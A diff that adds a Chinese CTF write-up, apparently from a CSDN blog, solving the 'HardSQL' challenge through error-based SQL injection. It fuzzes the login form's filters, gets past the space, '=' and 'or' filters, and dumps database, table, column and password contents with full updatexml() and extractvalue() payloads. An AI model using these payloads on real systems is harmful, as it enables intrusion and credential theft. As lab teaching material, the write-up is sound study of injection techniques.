@@ -1039,6 +1039,103 @@ F12查看源码：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/3601
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134408344?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134408344%22%2C%22source%22%3A%22m0_73734159%22%7D
 
+## 非常经典的一道SQL报错注入题目[极客大挑战 2019]HardSQL 1（两种解法！）
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700028192100-072fef37-e469-4344-87d7-0fed3ffefaf0.png#averageHue=%231f1e1e&clientId=u48b98de8-8a98-4&from=paste&height=788&id=iXSwb&originHeight=985&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=595618&status=done&style=none&taskId=u5b63bea1-1220-4822-b6ec-1efc65dfa3e&title=&width=1527.2)
+> 没错，又是我，这群该死的黑客竟然如此厉害，所以我回去爆肝SQL注入，这次，再也没有人能拿到我的flag了
+> 做了好多这个作者出的题了，看来又要上强度了
+
+判断注入类型
+> username：admin
+> password：1
+> **这里把参数password作为注入点**
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700114909235-b7dcf7bb-417c-4e3c-8ef5-a34d665354e9.png#averageHue=%23222020&clientId=ueddd42b1-c7c6-4&from=paste&height=734&id=u14beb817&originHeight=917&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593759&status=done&style=none&taskId=u86855b31-980b-4f13-bab6-78d992b4ae7&title=&width=1536)<br />`1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700114953260-feaa1c75-a98f-4227-bde3-72181ac3e2c6.png#averageHue=%23222121&clientId=ueddd42b1-c7c6-4&from=paste&height=726&id=u3bc62ac0&originHeight=908&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593365&status=done&style=none&taskId=u3d9a005a-7dd9-4f9c-83d1-086ad39e3c8&title=&width=1535.2)
+> 单引号的字符型注入
+
+万能密码注入<br />`1' or '1'='1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115490244-e45bae46-05b7-4528-a421-2cef342d6943.png#averageHue=%23272424&clientId=ueddd42b1-c7c6-4&from=paste&height=642&id=u7452269d&originHeight=802&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=532693&status=done&style=none&taskId=u574043a9-5be8-47d6-9685-504a0945edc&title=&width=1536)
+> 万能密码注入被链接
+> 猜测某些字符或者关键字被过滤
+
+SQL注入字典查过滤字符<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115657835-43204e90-7d3f-4af7-ac62-96c74ea0c8a8.png#averageHue=%23f9f9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=uf1941041&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=149391&status=done&style=none&taskId=uf98b22f9-d8c4-4563-9bc3-6c4fd82b927&title=&width=1374.4)<br />Intruder字典爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115719088-db4cf3aa-9990-4ff8-98aa-cf249c1753c7.png#averageHue=%23faf9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=ud9f53580&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117221&status=done&style=none&taskId=u5483c875-a79f-4e5e-b6da-8972aa72cd9&title=&width=1374.4)<br />光标选中参数password的值1-Add选择爆破目标![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115995428-128ae817-15d7-401a-b1b9-1939a49197d8.png#averageHue=%23f9f9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=uef3caff1&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104293&status=done&style=none&taskId=ufd00bf26-0c4a-4b13-a5de-debc83d619d&title=&width=1374.4)<br />选用字典<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115828530-08c47162-6a09-4dcf-ae7a-3177ca387950.png#averageHue=%23f8f7f7&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u6f39ac02&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117154&status=done&style=none&taskId=u2d6e7851-cef8-478f-bb99-3e30c704156&title=&width=1374.4)<br />Start attack开始爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115886342-c23bf08d-5ec2-4e0c-9269-511a0a646a11.png#averageHue=%23f7f7f7&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u59319188&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105062&status=done&style=none&taskId=ub4dc8884-f85a-4292-9411-c5eba5f4244&title=&width=1374.4)<br />OK<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115914796-8e6b4a95-84ab-4206-8dc5-c1cd33422d24.png#averageHue=%23f6f6f6&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u4fb023bb&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111125&status=done&style=none&taskId=u563c4962-79e6-404e-b1e9-2014b6c7420&title=&width=1374.4)<br />爆破结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700116953369-bd42e81b-7182-4614-b706-77aa4ecc8010.png#averageHue=%23fbfaf9&clientId=ueddd42b1-c7c6-4&from=paste&height=864&id=u688ce8c1&originHeight=1080&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124437&status=done&style=none&taskId=uf85357a2-11ea-4519-9f83-93a5c25ac3b&title=&width=1535.2)
+> 741为过滤内容
+> 可以看到很多字符=、--+、/**/和一些注入命令union、by、'1'='1等被过滤
+
+继续测试
+> admin
+> 1' or
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700132653521-10291f28-ff0a-4054-b302-6103a47a38d2.png#averageHue=%23242323&clientId=u91492660-2dde-4&from=paste&height=689&id=ud7064c62&originHeight=861&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569374&status=done&style=none&taskId=u32c775dd-83f0-4a7e-a782-8b1ccce9959&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700132761816-5369e015-9140-41d5-a8ab-44fcc6723dd0.png#averageHue=%23232121&clientId=u91492660-2dde-4&from=paste&height=669&id=uf3013809&originHeight=836&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559525&status=done&style=none&taskId=u3b6dbc29-c831-4471-b863-af652ac7fba&title=&width=1535.2)
+> 可以看到被拦截了
+> 通过刚才的字典爆破，可以知道1'和or是没有被过滤的
+> 那么真相只有一个，卧槽，空格被过滤了，我直呼好家伙
+
+> 刚开始本想尝试编码绕过空格，结果不行，这里猜测到了空格限制
+
+空格限制
+> admin
+> 1'(or)
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700133483156-fe79b78c-1529-4a48-aefa-89ffc606bf29.png#averageHue=%23212121&clientId=u91492660-2dde-4&from=paste&height=714&id=ubb30a5c5&originHeight=892&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593765&status=done&style=none&taskId=ude3e6d8b-2c67-4041-8cc6-fcc73b15f97&title=&width=1535.2)
+> like没有被过滤，使用like可以绕过=号，like <=> =
+
+**重新构造万能密码**<br />`1'or((1)like(1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700136682992-e9c6edcc-7197-4ca4-b56c-cdeacc3cd842.png#averageHue=%23242423&clientId=u91492660-2dde-4&from=paste&height=721&id=u52300fd0&originHeight=901&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588014&status=done&style=none&taskId=uf0801150-4190-4b8b-b46b-98c315b4b08&title=&width=1535.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700136703141-673d48cb-537c-4a3c-b55c-df35f4bb1ca5.png#averageHue=%23272524&clientId=u91492660-2dde-4&from=paste&height=434&id=u4682706c&originHeight=542&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=275712&status=done&style=none&taskId=u1f5be12b-185e-4491-b592-28bd3a178a0&title=&width=1534.4)
+> 可以看到绕过了空格限制
+> 同时也登陆成功了
+> 然后想到了之前做过很类似的一道题
+> SQL报错注入也用到了空格限制
+> （已经试了堆叠注入和联合注入都不行）
+> 这里就索性试一下SQL报错注入
+
+**知识一、**
+> SQL报错注入常用函数
+> 
+> 两个基于XPAT（XML)的报错注入函数
+> 函数updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数
+> 函数extractvalue() 是mysql对xml文档数据进行查询的xpath函数
+> 注入原理：
+> （在使用语句时，如果XPath_string不符合该种类格式，就会出现格式错误，并且会以系统报错的形式提示出错误！）
+> （局限性查询字符串长度最大为32位，要突破此限制可使用right(),left()，substr()来截取字符串）
+> 
+> 其它
+> 函数floor() mysql中用来取整的函数
+> 函数exp() 此函数返回e(自然对数的底)指数X的幂值的函数
+
+**首先使用updatexml()函数进行SQL报错注入**<br />爆库<br />`1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137062141-c6e84467-bc12-495a-bc13-3b34c42798e7.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=306&id=u2c59b5e2&originHeight=382&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167622&status=done&style=none&taskId=uee57976c-5bac-47c2-8f2d-5f0118c8c01&title=&width=1524)
+> 得到库名geek
+
+查表<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137193154-ac8dadf9-8383-4c75-81c3-6c39f002e0dc.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=293&id=u6277140c&originHeight=366&originWidth=1898&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=160341&status=done&style=none&taskId=u15a895f1-efa2-44ed-8ab8-461a9d72177&title=&width=1518.4)
+> 得到数据表H4rDsq1
+
+爆字段<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137376657-c6f0d854-d9f6-4cd3-b953-49a5c87c5cdc.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=286&id=u11e854de&originHeight=357&originWidth=1896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152073&status=done&style=none&taskId=u3419a2c7-8376-4aef-ac11-c4f81eca4c3&title=&width=1516.8)
+> 得到三个字段：id、username、password
+
+查字段内容<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137581168-867dafa8-ff44-4c64-bdf2-4f25c239b011.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=280&id=uf93349e1&originHeight=350&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=151119&status=done&style=none&taskId=ue6eae8dd-872c-4970-ac14-c4e94384075&title=&width=1524)
+> 得到前一半flag值flag{389c9161-c2eb-403a-80
+
+使用right()突破字符限制<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137784195-578d14e9-7d3e-4c34-843e-19775c00c83d.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=311&id=uc732f577&originHeight=389&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=181987&status=done&style=none&taskId=ud122c64e-c490-44a1-bf6d-118ba251020&title=&width=1524)
+> 得到后一段flag值b-403a-8062-80f219ca1c30}
+
+**拼接得到最终flag：**<br />`flag{389c9161-c2eb-403a-8062-80f219ca1c30}`
+
+**使用extractvalue()函数进行SQL报错注入**
+> **知识：^这个符号可以绕过or的限制**
+> **这两种函数大同小异，不再赘述**
+> **当然也可以不使用^来绕过or限制，单一的()绕过空格限制也可以**
+> **大家可以看下边进行对比学习**
+
+`1'^extractvalue(1,concat(0x7e,(select(database()))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138297318-dc683b1f-85b8-4d11-85f0-ed3a99f8fe9d.png#averageHue=%230f0f0f&clientId=u91492660-2dde-4&from=paste&height=584&id=u3a7892c4&originHeight=730&originWidth=1898&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=524678&status=done&style=none&taskId=ufeed9b2a-b28c-47bf-a38a-d87cc2fbb65&title=&width=1518.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138318294-da6c97f7-1a34-4502-bc26-17c3957be973.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=273&id=u277b14c4&originHeight=341&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135176&status=done&style=none&taskId=u9c7e3b0b-1a7d-49f7-8124-b3f5a89d46d&title=&width=1524)<br />`1'or(extractvalue(1,concat(0x7e,(select(database())))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138372482-9340e361-e3c8-46db-8e9b-78b59ae07513.png#averageHue=%230f0f0f&clientId=u91492660-2dde-4&from=paste&height=544&id=u2e6c5dd0&originHeight=680&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=491577&status=done&style=none&taskId=uf04c2e44-79ba-4f8a-9013-9f8da4b3e4d&title=&width=1522.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138392507-e1c4f4ad-8f44-4f37-bf7a-e444b76a4393.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=282&id=u810ea59a&originHeight=353&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147491&status=done&style=none&taskId=u5b3e12de-f72a-42d2-95a1-95a159aa198&title=&width=1522.4)
+> 好了大家已经明显看到了^和()绕过不同限制的区别
+> 那么下面就给大家一直演示^绕过or限制了（上一个updatexml()函数使用的是()绕过空格限制）
+
+`1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138734330-20db4985-cad7-4e64-96cf-bc2363dade82.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=278&id=u4e9491f1&originHeight=347&originWidth=1883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152024&status=done&style=none&taskId=u899840eb-346b-4cf0-a940-a7685c4bfd6&title=&width=1506.4)<br />`1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138814522-047d9b1a-d00b-4d98-9f3a-738755cb91c0.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=266&id=u4b758f6c&originHeight=332&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132671&status=done&style=none&taskId=u601d5103-c494-4d4f-b570-c710107c948&title=&width=1519.2)<br />`1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138895689-9ac1d5f0-054d-4da9-9369-c0bb525d19f8.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=261&id=u33ad1618&originHeight=326&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133493&status=done&style=none&taskId=u7e79de24-3e1a-440a-8ffd-72e9a84ef2d&title=&width=1519.2)<br />使用right()突破字符限制<br />`1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700139057690-f5b75288-5af6-4c31-a513-80cc58099d0b.png#averageHue=%23030101&clientId=u91492660-2dde-4&from=paste&height=247&id=u2389919c&originHeight=309&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112698&status=done&style=none&taskId=ud15248b3-84d3-4cec-84c0-fc27c77103a&title=&width=1517.6)<br />**拼接得到最终flag：**<br />`flag{389c9161-c2eb-403a-8062-80f219ca1c30}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134450773?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134450773%22%2C%22source%22%3A%22m0_73734159%22%7D
+
+
+
+
+
 
 
 
